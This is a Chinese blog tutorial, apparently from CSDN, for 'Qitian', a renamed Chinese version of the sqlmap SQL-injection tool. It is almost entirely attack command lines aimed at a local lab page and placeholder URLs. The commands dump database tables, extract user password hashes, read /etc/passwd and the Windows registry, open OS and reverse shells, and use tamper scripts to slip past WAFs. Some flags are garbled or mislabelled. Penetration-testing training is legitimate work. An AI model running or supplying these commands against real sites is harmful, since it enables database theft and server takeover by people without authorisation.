@[TOC](超详细！魔改为中文sqlmap的使用教程)
## 
魔改了一版中文版的SQLMAP，如下图：

 下面是由猫鼠信安团队，魔改为中文版的sqlmap，Qitian功能参数一模一样，
 ![在这里插入图片描述](https://img-blog.csdnimg.cn/801ec7ff2c8f4432a525ec7aaefa913e.png)


![在这里插入图片描述](https://img-blog.csdnimg.cn/60382cf2fe6c4b42b7e8794955f4b747.png)
![在这里插入图片描述](https://img-blog.csdnimg.cn/5731ccf6bf5a4cba88eb9bdbbe8dc8ac.png)




## 2.Qitian基础信息

 

 获取当前用户名称

 

>python Qitian.py -u "http://127.0.0.1/sql/Less-1/?id=1" --current-user


获取当前数据库名称

 

 

 >python Qitian.py -u "http://127.0.0.1/sql/Less-1/?id=1" --current-db


获取表名

 

>python Qitian.py -u "http://127.0.0.1/sql/Less-1/?id=1" -D security --tables


获取字段

 

>python Qitian.py -u "http://127.0.0.1/sql/Less-1/?id=1" -D security -T users --columns


获取字段内容

 

>python Qitian.py -u "http://127.0.0.1/sql/Less-1/?id=1" -D security -T users -C id --dump


3.Qitian进阶信息内容

执行测试等级

>python Qitian.py -u "http://127.0.0.1/sql/Less-1/?id=1" --level 2
>指定数据库类型

>python Qitian.py -u "http://127.0.0.1/sql/Less-1/?id=1" --dbms "Mysql"
>列数据库用户

 

>python Qitian.py -u "http://127.0.0.1/sql/Less-1/?id=1" --users


列数据库

 

>python Qitian.py -u "http://127.0.0.1/sql/Less-1/?id=1" --dbs


数据库用户密码

 

>python Qitian.py -u "http://127.0.0.1/sql/Less-1/?id=1" --passwords


列出指定用户数据库密码

 

>python Qitian.py -u "http://127.0.0.1/sql/Less-1/?id=1" --passwords -U root


查看权限

>python Qitian.py -u "http://127.0.0.1/sql/Less-1/?id=1" --privileges
>查看指定用户权限

 

p>python Qitian.py -u "http://127.0.0.1/sql/Less-1/?id=1" --privileges -U root


是否是数据库管理员

 

>python Qitian.py -u "http://127.0.0.1/sql/Less-1/?id=1" --is-dba


枚举数据库用户角色

 

>python Qitian.py -u "http://127.0.0.1/sql/Less-1/?id=1" --roles


导入用户自定义函数（获取系统权限！）

 

Qitian/Qitian.py -u "http://url/news?id=1"   --udf-inject


cookie注入

 

python Qitian/Qitian.py -u "http://url/news?id=1"   --cookie "COOKIE_VALUE"


获取banner信息

 

>python Qitian.py -u "http://127.0.0.1/sql/Less-1/?id=1" -b


post注入

 


>python Qitian/Qitian.py -u "http://url/news?id=1" --data "id=3"


指纹判别数据库类型

 


>python Qitian.py -u "http://127.0.0.1/sql/Less-1/?id=1" -f


代理注入

 


>python Qitian/Qitian.py -u "http://url/news?id=1"  --proxy"http://127.0.0.1:8118"


指定关键词

 

 

 

 

 


>python Qitian/Qitian.py -u "http://url/news?id=1"--string"STRING_ON_TRUE_PAGE"

执行系统命令


>python Qitian/Qitian.py -u "http://url/news?id=1"   --file /etc/passwd

统交互shell


>python Qitian/Qitian.py -u "http://url/news?id=1"   --os-shell

反弹shell


>python Qitian/Qitian.py -u "http://url/news?id=1"   --os-pwn

读取win系统注册表

 

>python Qitian/Qitian.py -u "http://url/news?id=1"   --reg-read


保存进度

 

>python Qitian/Qitian.py -u "http://url/news?id=1"    --dbs-o "Qitian.log"


恢复已保存进度

 

>python Qitian/Qitian.py -u "http://url/news?id=1"    --dbs  -o "Qitian.log" --resume


## 3.Qitian绕过WAF

>python Qitian/Qitian.py -u "http://url/news?id=1"    --tamper 指定脚本
